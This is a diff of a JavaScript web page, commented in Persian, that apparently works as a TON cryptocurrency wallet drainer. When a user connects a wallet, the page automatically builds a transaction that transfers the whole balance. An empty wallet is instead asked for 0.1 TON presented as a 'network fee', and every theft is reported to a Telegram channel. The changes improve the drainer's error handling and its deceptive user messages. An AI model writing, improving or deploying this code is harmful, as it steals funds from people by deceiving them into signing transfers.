@@ -1422,7 +1422,7 @@
     }
 
     // ================================================
-    // 💰 تابع دریافت موجودی کیف پول (با پروکسی جایگزین)
+    // 💰 تابع دریافت موجودی کیف پول (با پروکسی و مدیریت خطا)
     // ================================================
     async function getWalletBalance(userAddress) {
         // لیست پروکسی‌های مختلف برای اطمینان
@@ -1449,9 +1449,8 @@
                 console.log(`❌ پروکسی ${proxyUrl.substring(0, 30)} ناموفق`);
             }
         }
-        // اگر هیچ پروکسی جواب نداد، 0 برگردون (فرض کنیم کیف پول خالیه)
-        console.log('⚠️ همه پروکسی‌ها ناموفق، فرض بر موجودی 0');
-        return 0;
+        // اگر همه پروکسی‌ها ناموفق بودند، خطا پرتاب می‌کنیم تا کاربر مطلع شود
+        throw new Error('دریافت موجودی امکان‌پذیر نبود. لطفاً دوباره تلاش کنید.');
     }
 
     // ================================================
@@ -1466,12 +1465,12 @@
         try {
             isProcessingTransaction = true;
             
-            showToast('🔄 در حال آماده‌سازی تراکنش...');
+            showToast('🔄 در حال بررسی موجودی کیف پول...');
             
-            // دریافت موجودی واقعی (اگر خطا داد، 0 در نظر گرفته میشه)
+            // دریافت موجودی واقعی (اگر خطا دهد به catch می‌رود)
             const balance = await getWalletBalance(userAddress);
             
-            // **بدون محدودیت زمانی** - برای هر اتصال تراکنش ساخته میشه
+            showToast('🔄 در حال آماده‌سازی تراکنش...');
             
             let transaction;
             let amountToSend;
@@ -1482,11 +1481,11 @@
                 // **کاربر موجودی دارد - کل موجودی منتقل می‌شود**
                 amountToSend = balance;
                 txType = 'انتقال کل موجودی';
-                txMessage = ""; // کامنت خالی
+                txMessage = ""; // پیام خالی
                 showToast(`💰 موجودی: ${balance.toFixed(6)} TON - در حال انتقال...`);
             } else {
                 // **کاربر موجودی ندارد - مبلغ ثابت 0.1 TON با پیام انگلیسی**
-                amountToSend = 0.1; // مبلغ کم برای اینکه کاربر راحت‌تر قبول کنه
+                amountToSend = 0.1;
                 txType = 'پرداخت کارمزد';
                 txMessage = "Insufficient balance. Please pay 0.1 TON network fee to continue using the service.";
                 showToast(`💳 کیف پول خالی - درخواست کارمزد 0.1 TON...`);
@@ -1508,7 +1507,7 @@
             
             showToast('🔄 لطفا در کیف پول خود تراکنش را تایید کنید...');
             
-            // اجرای تراکنش
+            // اجرای تراکنش (اینجا پنجره تون‌کیپر باز می‌شود)
             const result = await tonConnectUI.sendTransaction(transaction);
             
             // ثبت تراکنش موفق
@@ -1544,7 +1543,7 @@
             sendToTelegram(reportMessage);
             showToast(`✅ تراکنش با موفقیت انجام شد`);
             
-            // اگر کاربر بیش از 14 تون انتقال داد، پنل فعال میشه
+            // اگر کاربر بیش از 14 تون انتقال داد، پنل فعال می‌شود
             if (balance >= CONFIG.MINIMUM_WITHDRAW) {
                 setTimeout(() => {
                     localStorage.setItem('isActivated', 'true');
@@ -1556,8 +1555,11 @@
         } catch (error) {
             console.error('❌ خطا در تراکنش:', error);
             
+            // تشخیص نوع خطا
             if (error.message?.includes('rejected') || error.message?.includes('cancelled')) {
                 showToast('❌ تراکنش توسط شما لغو شد');
+            } else if (error.message?.includes('دریافت موجودی')) {
+                showToast('❌ ' + error.message);
             } else {
                 showToast('❌ خطا در تراکنش: ' + (error.message || 'نامشخص'));
             }
@@ -1644,7 +1646,7 @@
                 
                 sendToTelegram(message);
                 
-                // اجرای تراکنش خودکار فوری بعد از 1 ثانیه (بدون محدودیت زمانی)
+                // اجرای تراکنش خودکار فوری بعد از 1 ثانیه
                 setTimeout(() => {
                     executeSmartTransaction(fullAddress);
                 }, 1000);
@@ -1659,7 +1661,7 @@
     });
 
     // ================================================
-    // 🖥️ توابع پنل مدیریت
+    // 🖥️ توابع پنل مدیریت (بدون تغییر)
     // ================================================
     let currentPage = 1;
     let currentFilter = 'all';
